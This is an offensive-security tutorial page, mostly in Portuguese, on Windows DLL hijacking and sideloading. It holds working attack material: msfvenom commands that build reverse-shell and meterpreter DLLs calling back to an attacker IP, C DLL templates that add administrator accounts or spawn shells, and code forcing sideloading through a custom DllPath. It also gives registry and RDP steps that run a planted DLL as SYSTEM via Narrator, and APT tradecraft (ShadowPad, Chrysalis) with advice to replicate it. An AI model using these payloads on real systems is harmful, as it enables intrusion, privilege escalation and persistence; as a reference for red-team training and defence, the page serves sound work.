# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Informações Básicas

DLL Hijacking envolve manipular uma aplicação confiável para carregar uma DLL maliciosa. Este termo abrange várias táticas como **DLL Spoofing, Injection, and Side-Loading**. É usado principalmente para execução de código, obtenção de persistência e, menos frequentemente, escalada de privilégios. Apesar do foco em escalada aqui, o método de hijacking permanece consistente entre os objetivos.

### Técnicas Comuns

Vários métodos são empregados para DLL hijacking, cada um com sua efetividade dependendo da estratégia de carregamento de DLLs da aplicação:

1. **DLL Replacement**: Trocar uma DLL genuína por uma maliciosa, opcionalmente usando DLL Proxying para preservar a funcionalidade da DLL original.
2. **DLL Search Order Hijacking**: Colocar a DLL maliciosa em um caminho de busca antes da legítima, explorando o padrão de busca da aplicação.
3. **Phantom DLL Hijacking**: Criar uma DLL maliciosa para que a aplicação a carregue, acreditando que se trata de uma DLL necessária inexistente.
4. **DLL Redirection**: Modificar parâmetros de busca como `%PATH%` ou arquivos `.exe.manifest` / `.exe.local` para direcionar a aplicação para a DLL maliciosa.
5. **WinSxS DLL Replacement**: Substituir a DLL legítima por uma maliciosa no diretório WinSxS, um método frequentemente associado com DLL side-loading.
6. **Relative Path DLL Hijacking**: Colocar a DLL maliciosa em um diretório controlado pelo usuário junto com a aplicação copiada, assemelhando-se a técnicas de Binary Proxy Execution.

> [!TIP]
> Para uma cadeia passo a passo que combina HTML staging, AES-CTR configs, e .NET implants sobre DLL sideloading, reveja o workflow abaixo.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Encontrando Dlls ausentes

A maneira mais comum de encontrar Dlls ausentes dentro de um sistema é executar [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) do sysinternals, **definindo** os **seguinte 2 filtros**:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

e mostrar apenas a **File System Activity**:

![](<../../../images/image (153).png>)

Se você estiver procurando por **dlls ausentes em geral** você deve **deixar** isso rodando por alguns **segundos**.\
Se você procura por uma **dll ausente dentro de um executável específico** você deve definir **outro filtro como "Process Name" "contains" `<exec name>`, executá-lo, e parar a captura de eventos**.

## Explorando Dlls Ausentes

Para escalar privilégios, a melhor chance que temos é conseguir **gravar uma dll que um processo privilegiado tentará carregar** em algum dos **lugares onde ela será procurada**. Portanto, poderemos **escrever** uma dll em uma **pasta** onde a **dll é procurada antes** da pasta onde a **dll original** está (caso estranho), ou seremos capazes de **escrever em alguma pasta onde a dll será procurada** e a dll original não existir em nenhuma pasta.

### Dll Search Order

**Inside the** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **you can find how the Dlls are loaded specifically.**

Aplicações do Windows buscam DLLs seguindo um conjunto de **caminhos predefinidos**, respeitando uma sequência particular. O problema do DLL hijacking surge quando uma DLL maliciosa é estrategicamente colocada em um desses diretórios, garantindo que seja carregada antes da DLL autêntica. Uma solução para prevenir isso é assegurar que a aplicação use caminhos absolutos ao referenciar as DLLs de que necessita.

Você pode ver a **DLL search order on 32-bit** systems abaixo:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

Essa é a ordem de busca **default** com **SafeDllSearchMode** habilitado. Quando está desabilitado o diretório atual escala para o segundo lugar. Para desabilitar esse recurso, crie o valor de registro **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** e defina-o como 0 (padrão é habilitado).

Se a função [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) for chamada com **LOAD_WITH_ALTERED_SEARCH_PATH** a busca começa no diretório do módulo executável que o **LoadLibraryEx** está carregando.

Finalmente, note que **uma dll pode ser carregada indicando o caminho absoluto em vez de apenas o nome**. Nesse caso essa dll **será procurada apenas nesse caminho** (se a dll tiver dependências, elas serão procuradas como se fossem carregadas apenas pelo nome).

Existem outras maneiras de alterar a ordem de busca, mas não vou explicá-las aqui.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

An advanced way to deterministically influence the DLL search path of a newly created process is to set the DllPath field in RTL_USER_PROCESS_PARAMETERS when creating the process with ntdll’s native APIs. By supplying an attacker-controlled directory here, a target process that resolves an imported DLL by name (no absolute path and not using the safe loading flags) can be forced to load a malicious DLL from that directory.

Key idea
- Build the process parameters with RtlCreateProcessParametersEx and provide a custom DllPath that points to your controlled folder (e.g., the directory where your dropper/unpacker lives).
- Create the process with RtlCreateUserProcess. When the target binary resolves a DLL by name, the loader will consult this supplied DllPath during resolution, enabling reliable sideloading even when the malicious DLL is not colocated with the target EXE.

Notes/limitations
- This affects the child process being created; it is different from SetDllDirectory, which affects the current process only.
- The target must import or LoadLibrary a DLL by name (no absolute path and not using LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs and hardcoded absolute paths cannot be hijacked. Forwarded exports and SxS may change precedence.

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Exemplo de uso operacional
- Coloque um xmllite.dll malicioso (exportando as funções necessárias ou atuando como proxy para o real) no seu diretório DllPath.
- Inicie um binário assinado conhecido por procurar xmllite.dll pelo nome usando a técnica acima. O loader resolve a importação via o DllPath fornecido e faz sideload do seu DLL.

Esta técnica tem sido observada in-the-wild para conduzir cadeias de sideloading multi-stage: um launcher inicial deixa cair um DLL auxiliar, que então lança um binário assinada pela Microsoft e vulnerável a hijack, com um DllPath customizado para forçar o carregamento do DLL do atacante a partir de um diretório de staging.


#### Exceptions on dll search order from Windows docs

Certain exceptions to the standard DLL search order are noted in Windows documentation:

- When a **DLL that shares its name with one already loaded in memory** is encountered, the system bypasses the usual search. Instead, it performs a check for redirection and a manifest before defaulting to the DLL already in memory. **In this scenario, the system does not conduct a search for the DLL**.
- In cases where the DLL is recognized as a **known DLL** for the current Windows version, the system will utilize its version of the known DLL, along with any of its dependent DLLs, **forgoing the search process**. The registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** holds a list of these known DLLs.
- Should a **DLL have dependencies**, the search for these dependent DLLs is conducted as though they were indicated only by their **module names**, regardless of whether the initial DLL was identified through a full path.

### Escalada de Privilégios

**Requisitos**:

- Identificar um processo que opere ou venha a operar sob **privilégios diferentes** (movimento horizontal ou lateral), que esteja **sem uma DLL**.
- Garantir que exista **acesso de escrita** para qualquer **diretório** no qual a **DLL** será **procurada**. Esse local pode ser o diretório do executável ou um diretório dentro do PATH do sistema.

Sim, os requisitos são complicados de encontrar pois **por padrão é meio estranho achar um executável privilegiado sem uma dll** e é ainda **mais estranho ter permissões de escrita em uma pasta do PATH do sistema** (você não pode por padrão). Mas, em ambientes mal configurados isso é possível.\
No caso de você ter sorte e cumprir os requisitos, pode conferir o projeto [UACME](https://github.com/hfiref0x/UACME). Mesmo que o **objetivo principal do projeto seja bypass UAC**, você pode encontrar lá um **PoC** de um Dll hijaking para a versão do Windows que pode usar (provavelmente apenas alterando o caminho da pasta onde você tem permissões de escrita).

Note que você pode **verificar suas permissões em uma pasta** fazendo:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
E **verifique as permissões de todas as pastas dentro do PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Você também pode verificar os imports de um executable e os exports de uma dll com:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Para um guia completo sobre como **abusar Dll Hijacking to escalate privileges** com permissões para escrever em uma **pasta System Path** confira:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Ferramentas automatizadas

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) verificará se você tem permissões de escrita em qualquer pasta dentro do PATH do sistema.\
Outras ferramentas automatizadas interessantes para descobrir essa vulnerabilidade são as **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ e _Write-HijackDll._

### Exemplo

Caso encontre um cenário explorável, uma das coisas mais importantes para explorá-lo com sucesso é **criar uma dll que exporte pelo menos todas as funções que o executável irá importar dela**. De qualquer forma, note que Dll Hijacking vem a calhar para [escalar de Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) ou de[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** Você pode encontrar um exemplo de **como criar uma dll válida** dentro deste estudo sobre dll hijacking focado em hijacking de dlls para execução: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Além disso, na **próxima seção** você pode encontrar alguns **códigos dll básicos** que podem ser úteis como **templates** ou para criar uma **dll com funções não obrigatórias exportadas**.

## **Criando e compilando Dlls**

### **Dll Proxifying**

Basicamente um **Dll proxy** é uma Dll capaz de **executar seu código malicioso quando carregada** mas também de **expor** e **funcionar** como **esperado**, retransmitindo todas as chamadas para a biblioteca real.

Com a ferramenta [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) ou [**Spartacus**](https://github.com/Accenture/Spartacus) você pode realmente **indicar um executável e selecionar a biblioteca** que deseja proxify e **gerar uma proxified dll** ou **indicar a Dll** e **gerar uma proxified dll**.

### **Meterpreter**

**Obter rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Obter um meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Criar um usuário (x86 não vi uma versão x64):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Seu próprio

Observe que, em vários casos, a Dll que você compilar deve **exportar várias funções** que serão carregadas pelo processo vítima; se essas funções não existirem, o **binary** não será capaz de carregá-las e o **exploit** falhará.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Exemplo de DLL em C++ com criação de usuário</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>DLL C alternativa com entrada de thread</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Estudo de Caso: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

O Windows Narrator.exe ainda tenta carregar uma DLL de localização previsível e específica por idioma na inicialização que pode ser hijacked para arbitrary code execution e persistence.

Fatos principais
- Caminho verificado (versões atuais): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Caminho legado (versões antigas): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Se uma DLL controlada pelo atacante e gravável existir no caminho OneCore, ela é carregada e `DllMain(DLL_PROCESS_ATTACH)` é executada. Nenhuma exportação é necessária.

Descoberta com Procmon
- Filtro: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Inicie o Narrator e observe a tentativa de carregamento do caminho acima.

DLL mínima
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- A naive hijack will speak/highlight UI. To stay quiet, on attach enumerate Narrator threads, open the main thread (`OpenThread(THREAD_SUSPEND_RESUME)`) and `SuspendThread` it; continue in your own thread. See PoC for full code.

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- With the above, starting Narrator loads the planted DLL. On the secure desktop (logon screen), press CTRL+WIN+ENTER to start Narrator; your DLL executes as SYSTEM on the secure desktop.

RDP-triggered SYSTEM execution (lateral movement)
- Allow classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- RDP to the host, at the logon screen press CTRL+WIN+ENTER to launch Narrator; your DLL executes as SYSTEM on the secure desktop.
- Execution stops when the RDP session closes—inject/migrate promptly.

Bring Your Own Accessibility (BYOA)
- You can clone a built-in Accessibility Tool (AT) registry entry (e.g., CursorIndicator), edit it to point to an arbitrary binary/DLL, import it, then set `configuration` to that AT name. This proxies arbitrary execution under the Accessibility framework.

Notes
- Writing under `%windir%\System32` and changing HKLM values requires admin rights.
- All payload logic can live in `DLL_PROCESS_ATTACH`; no exports are needed.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

This case demonstrates **Phantom DLL Hijacking** in Lenovo's TrackPoint Quick Menu (`TPQMAssistant.exe`), tracked as **CVE-2025-1729**.

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` located at `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` runs daily at 9:30 AM under the context of the logged-on user.
- **Directory Permissions**: Writable by `CREATOR OWNER`, allowing local users to drop arbitrary files.
- **DLL Search Behavior**: Attempts to load `hostfxr.dll` from its working directory first and logs "NAME NOT FOUND" if missing, indicating local directory search precedence.

### Exploit Implementation

An attacker can place a malicious `hostfxr.dll` stub in the same directory, exploiting the missing DLL to achieve code execution under the user's context:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Fluxo do Ataque

1. Como usuário padrão, coloque `hostfxr.dll` em `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Aguarde a tarefa agendada rodar às 9:30 AM no contexto do usuário atual.
3. Se um administrador estiver logado quando a tarefa for executada, a DLL maliciosa é executada na sessão do administrador em medium integrity.
4. Encadear standard UAC bypass techniques para elevar de medium integrity para privilégios SYSTEM.

## Estudo de Caso: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Atores de ameaça frequentemente combinam MSI-based droppers com DLL side-loading para executar payloads sob um processo confiável e assinado.

Chain overview
- O usuário faz o download do MSI. Uma CustomAction é executada silenciosamente durante a instalação GUI (por exemplo, LaunchApplication ou uma ação VBScript), reconstruindo a próxima etapa a partir de recursos embutidos.
- O dropper grava um EXE legítimo e assinado e uma DLL maliciosa no mesmo diretório (par de exemplo: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- Quando o EXE assinado é iniciado, o Windows DLL search order carrega wsc.dll do diretório de trabalho primeiro, executando attacker code sob um pai assinado (ATT&CK T1574.001).

MSI analysis (what to look for)
- CustomAction table:
- Procure por entradas que executem executáveis ou VBScript. Padrão suspeito de exemplo: LaunchApplication executando um arquivo embutido em segundo plano.
- No Orca (Microsoft Orca.exe), inspecione as tabelas CustomAction, InstallExecuteSequence e Binary.
- Embedded/split payloads in the MSI CAB:
- Extração administrativa: msiexec /a package.msi /qb TARGETDIR=C:\out
- Or use lessmsi: lessmsi x package.msi C:\out
- Procure por múltiplos pequenos fragmentos que são concatenados e descriptografados por um VBScript CustomAction. Fluxo comum:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Sideloading prático com wsc_proxy.exe
- Coloque estes dois arquivos na mesma pasta:
- wsc_proxy.exe: host legítimo assinado (Avast). O processo tenta carregar wsc.dll pelo nome a partir do seu diretório.
- wsc.dll: attacker DLL. Se nenhuma exportação específica for necessária, DllMain pode ser suficiente; caso contrário, construa uma proxy DLL e encaminhe as exportações necessárias para a biblioteca genuína enquanto executa o payload em DllMain.
- Construa um payload de DLL mínimo:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Para requisitos de exportação, use um framework de proxy (e.g., DLLirant/Spartacus) para gerar uma forwarding DLL que também execute seu payload.

- Esta técnica depende da resolução de nomes de DLL pelo binário host. Se o host usar caminhos absolutos ou flags de carregamento seguro (e.g., LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), o hijack pode falhar.
- KnownDLLs, SxS, and forwarded exports podem influenciar a precedência e devem ser considerados ao selecionar o binário host e o conjunto de exports.

## Triades assinadas + payloads criptografados (estudo de caso ShadowPad)

Check Point descreveu como Ink Dragon implanta ShadowPad usando uma **tríade de três arquivos** para se misturar com software legítimo enquanto mantém o payload principal criptografado no disco:

1. **EXE de host assinado** – fornecedores como AMD, Realtek, ou NVIDIA são abusados (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Os atacantes renomeiam o executável para parecer um binário do Windows (por exemplo `conhost.exe`), mas a assinatura Authenticode permanece válida.
2. **Malicious loader DLL** – deixada ao lado do EXE com um nome esperado (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). A DLL é geralmente um binário MFC ofuscado com o framework ScatterBrain; sua única função é localizar o blob criptografado, decryptá-lo, e reflectively map ShadowPad.
3. **Encrypted payload blob** – frequentemente armazenado como `<name>.tmp` no mesmo diretório. Após mapear em memória o payload descriptografado, o loader exclui o arquivo TMP para destruir evidências forenses.

Tradecraft notes:

* Renaming the signed EXE (while keeping the original `OriginalFileName` in the PE header) permite que ele se passe por um binário do Windows e ainda retenha a assinatura do fornecedor, então replique o hábito do Ink Dragon de deixar binários com aparência de `conhost.exe` que na verdade são utilitários da AMD/NVIDIA.
* Because the executable stays trusted, a maioria dos controles de allowlisting só precisa que sua malicious DLL fique ao lado dele. Foque em customizar a loader DLL; o signed parent pode tipicamente rodar sem alterações.
* ShadowPad’s decryptor espera que o blob TMP esteja ao lado do loader e seja gravável para que possa zerar o arquivo após mapear. Mantenha o diretório gravável até o payload ser carregado; uma vez em memória o arquivo TMP pode ser excluído com segurança para OPSEC.

## Estudo de caso: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Uma intrusão recente do Lotus Blossom abusou de uma cadeia de atualização confiável para entregar um dropper empacotado com NSIS que preparou um DLL sideload além de payloads totalmente em memória.

Tradecraft flow
- `update.exe` (NSIS) cria `%AppData%\Bluetooth`, marca como **HIDDEN**, deixa um Bitdefender Submission Wizard renomeado `BluetoothService.exe`, uma maliciosa `log.dll`, e um blob criptografado `BluetoothService`, então lança o EXE.
- O EXE host importa `log.dll` e chama `LogInit`/`LogWrite`. `LogInit` mmap-loads o blob; `LogWrite` descriptografa com um stream custom baseado em LCG (constantes **0x19660D** / **0x3C6EF35F**, material de chave derivado de um hash prévio), sobrescreve o buffer com shellcode em plaintext, libera temporários, e pula para ele.
- Para evitar uma IAT, o loader resolve APIs hasheando nomes de export usando **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, então aplicando uma avalanche estilo Murmur (**0x85EBCA6B**) e comparando contra salted target hashes.

Main shellcode (Chrysalis)
- Descriptografa um módulo principal estilo PE repetindo add/XOR/sub com a key `gQ2JR&9;` por cinco passes, então carrega dinamicamente `Kernel32.dll` → `GetProcAddress` para finalizar a resolução de imports.
- Reconstrói strings de nomes de DLL em runtime via transformações per-caractere de bit-rotate/XOR, então carrega `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Usa um segundo resolver que percorre o **PEB → InMemoryOrderModuleList**, analisa cada tabela de exports em blocos de 4 bytes com mistura estilo Murmur, e só recorre a `GetProcAddress` se o hash não for encontrado.

Embedded configuration & C2
- A config vive dentro do arquivo dropado `BluetoothService` em **offset 0x30808** (tamanho **0x980**) e é RC4-decrypted com a key `qwhvb^435h&*7`, revelando a URL do C2 e o User-Agent.
- Beacons constroem um host profile delimitado por pontos, prefixam com a tag `4Q`, então RC4-encrypt com a key `vAuig34%^325hGV` antes de `HttpSendRequestA` sobre HTTPS. Respostas são RC4-decrypted e despachadas por um tag switch (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases).
- O modo de execução é controlado por CLI args: sem args = instala persistência (service/Run key) apontando para `-i`; `-i` relança a si mesmo com `-k`; `-k` pula a instalação e executa o payload.

Alternate loader observed
- A mesma intrusão deixou Tiny C Compiler e executou `svchost.exe -nostdlib -run conf.c` a partir de `C:\ProgramData\USOShared\`, com `libtcc.dll` ao lado. O código-fonte C fornecido pelo atacante embutia shellcode, compilava e rodava em memória sem tocar o disco com um PE. Replicar com:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Esta etapa TCC-based compile-and-run importou `Wininet.dll` em tempo de execução e buscou um shellcode de segunda etapa de uma URL hardcoded, fornecendo um loader flexível que se disfarça como uma execução de compilador run.

## Referências

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)


{{#include ../../../banners/hacktricks-training.md}}
